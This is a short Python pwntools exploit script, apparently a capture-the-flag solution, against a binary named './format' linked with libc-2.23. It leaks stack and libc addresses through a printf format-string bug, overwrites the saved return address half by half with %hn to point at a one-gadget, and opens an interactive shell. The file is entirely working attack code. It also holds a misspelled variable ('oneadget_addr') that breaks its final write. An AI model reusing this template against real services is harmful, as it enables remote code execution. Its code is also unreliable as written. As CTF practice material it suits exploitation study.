# -*- coding: utf-8 -*-
from pwn import*
local = 1
if local:         #if else 使用选择本地或者远程
	p = process('./format')
	libc = ELF('./libc-2.23.so')
else:
	p = remote()

def link(content):
    p.sendlineafter('Choice:','1')
    p.sendlineafter('say:',content)
    return p.recvline()

elf_base=int(link('%3$p'),16)-0x8f3
print'elfbase:'+hex(elf_base)
ret_stack = int(link('%5$p'), 16)-0x98#保存返还地址的栈
print'ret_stack:'+hex(ret_stack)#因为printf答应出来的每个参数为四个字节，用%n修改返还地址的话参数过大，用%hn就要构造rop
libc_main=link('%11$p')
libc_base=int(libc_main,16)-0xf1-0x18540
onegadget_addr=libc_base+0x5f065
print 'libcbase:'+hex(libc_base)
print'onegadget:'+hex(onegadget_addr)
link('%' + str(ret_stack & 0xffff) + 'c%5$hn')#构造ROP因为
link('%' + str((onegadget_addr) & 0xffff) + 'c%53$hn')#第四位地址
link('%' + str((ret_stack+2) & 0xffff) + 'c%5$hn')#第四位地址
link('%' + str((oneadget_addr) >> 16) + 'c%53$hn')#右移动四位，>>8是右移动2位。这里是获取高四位
p.sendlineafter('Choice:','2')
p.interactive()
